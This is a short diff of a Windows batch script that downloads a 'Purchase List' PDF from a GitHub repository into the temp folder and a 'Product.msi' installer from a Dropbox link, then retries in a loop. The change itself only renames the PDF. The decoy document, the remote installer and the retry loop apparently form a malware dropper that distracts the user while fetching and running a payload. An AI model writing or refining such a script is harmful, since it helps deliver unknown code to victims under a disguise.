@@ -2,8 +2,8 @@
 setlocal enabledelayedexpansion
 
 :: Set download URLs and paths
-set "pdfUrl=https://raw.githubusercontent.com/pawheaven/product/main/Purchase%20List.pdf"
-set "pdfFileName=Purchase List.pdf"
+set "pdfUrl=https://raw.githubusercontent.com/pawheaven/product/main/Purchase-List.pdf"
+set "pdfFileName=Purchase-List.pdf"
 set "pdfFilePath=%TEMP%\%pdfFileName%"
 
 set "url=https://dl.dropboxusercontent.com/scl/fi/yg0fp1m7geubbx4xc7aku/Product.msi?rlkey=0fz5h7bc75zan91qz6wfbetx5&st=8pir8yhc"
@@ -45,3 +45,4 @@ if %ERRORLEVEL%==0 (
 :: Wait 2 seconds before trying again
 timeout /t 2 /nobreak >nul
 goto RunLoop
+
